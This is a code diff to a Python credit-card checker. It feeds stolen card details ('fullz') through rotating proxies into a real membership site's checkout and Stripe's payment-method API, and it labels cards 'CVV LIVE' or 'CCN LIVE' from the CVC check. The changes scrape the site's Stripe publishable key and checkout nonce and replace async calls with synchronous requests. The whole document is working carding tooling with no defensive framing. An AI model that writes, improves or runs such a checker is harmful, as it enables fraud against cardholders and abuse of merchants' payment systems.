@@ -196,16 +196,20 @@ async def create_payment_method(fullz, session, proxy_str):
             'level': '2',
         }
 
-        # Gunakan async session GET
-        response = await session.get(
+        response = requests.get(
             'https://avweather.net/membership-account/membership-checkout/',
             params=params,
             headers=headers,
-            proxies=proxies,  # httpx AsyncClient menerima proxy ini, tapi di session async ini mungkin harusnya pakai proxy config waktu buat client (atau ignore ini)
+            proxies=proxies,
         )
-        text = await response.text()
-        
-        nonce = gets(text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
+
+        pk = gets(response.text, '"publishableKey":"', '",')
+        nonce = gets(response.text, '<input type="hidden" id="pmpro_checkout_nonce" name="pmpro_checkout_nonce" value="', '" />')
+        if not pk:
+            return {"html": response.text, "paid": False, "error": "Failed to get pk"}
+
+        if not nonce:
+            return {"html": response.text, "paid": False, "error": "Failed to get nonce"}
 
         headers = {
             'accept': 'application/json',
@@ -239,21 +243,15 @@ async def create_payment_method(fullz, session, proxy_str):
             'client_attribution_metadata[merchant_integration_source]':'elements',
             'client_attribution_metadata[merchant_integration_subtype]':'card-element',
             'client_attribution_metadata[merchant_integration_version]':'2017',
-            'key': 'pk_live_pCRAKLhapjviz7rKv7DEK7gO',
+            'key': pk,
         }
 
-        # Gunakan async session POST
-        response = await session.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers=headers,
-            data=data,
-            proxies=proxies,
-        )
-        pm_json = await response.json()
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, proxies=proxies,)
 
+        pm_json = response.json()
         id = pm_json.get('id')
         if not id:
-            return {"html": await response.text(), "paid": False, "error": "Failed to create payment method"}
+            return {"html": response.text, "paid": False, "error": "Failed to create payment method"}
 
         # Deteksi CVV LIVE / CCN LIVE berdasarkan cvc_check
         cvc_check = pm_json.get('card', {}).get('checks', {}).get('cvc_check', '')
@@ -264,9 +262,9 @@ async def create_payment_method(fullz, session, proxy_str):
         cvc_check = cvc_check.lower()
 
         if cvc_check == 'pass':
-            return {"html": await response.text(), "paid": False, "error": "CVV LIVE ❎"}
+            return {"html": response.text, "paid": False, "error": "CVV LIVE ❎"}
         elif cvc_check == 'fail':
-            return {"html": await response.text(), "paid": False, "error": "CCN LIVE ❎"}
+            return {"html": response.text, "paid": False, "error": "CCN LIVE ❎"}
 
         brand = pm_json.get('card', {}).get('brand', '')
         last4 = pm_json.get('card', {}).get('last4', '')
@@ -317,8 +315,7 @@ async def create_payment_method(fullz, session, proxy_str):
             'ExpirationYear': ano,
         }
 
-        # Gunakan async session POST
-        response = await session.post(
+        response = requests.post(
             'https://avweather.net/membership-account/membership-checkout/',
             params=params,
             headers=headers,
@@ -326,7 +323,7 @@ async def create_payment_method(fullz, session, proxy_str):
             proxies=proxies,
         )
 
-        html_text = await response.text()
+        html_text = response.text
         soup = BeautifulSoup(html_text, 'html.parser')
         paid_tag = soup.find("span", class_="pmpro_list_item_value pmpro_tag pmpro_tag-success")
 
@@ -373,8 +370,7 @@ async def multi_checking(fullz, proxies):
     proxy = random.choice(proxies)
     #print(f"Using proxy: {proxy}")  # Debug output
 
-    # Buat AsyncClient dengan proxy
-    async with httpx.AsyncClient(timeout=40, proxies=proxy) as session:
+    async with httpx.AsyncClient(timeout=40, proxy=proxy) as session:
         result = await create_payment_method(fullz, session, proxy)
         response = await charge_resp(result)
 
@@ -447,3 +443,5 @@ async def init_app():
 if __name__ == "__main__":
     app = asyncio.run(init_app())
     web.run_app(app, host="0.0.0.0", port=8080)
+
+
